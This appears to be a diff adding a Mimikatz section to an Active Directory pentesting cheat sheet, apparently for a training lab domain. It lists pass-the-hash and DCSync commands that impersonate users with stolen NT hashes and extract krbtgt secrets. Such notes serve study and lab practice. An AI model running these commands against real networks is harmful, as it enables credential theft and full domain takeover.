@@ -251,6 +251,17 @@ Includes web services (not just port 80)
   Enter-PSSession -Session $sesh
   ```
 
+## Mimikatz
+You can wrap these in for ex. `PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:lemons /domain:dollarcorp.moneycorp.local /ntlm:NThashHERE /run:powershell.exe`
+- Start new process as target user w/ NT hash:
+  ```
+  sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntlmhash> /run:powershell.exe
+  ```
+- Run a DCsync attack for a specific user:
+  ```
+  lsadump::dcsync /user:dcorp\krbtgt
+  ```
+
 ## BloodHound
 - Cypher Queries
   - All unconstrained delegation servers:
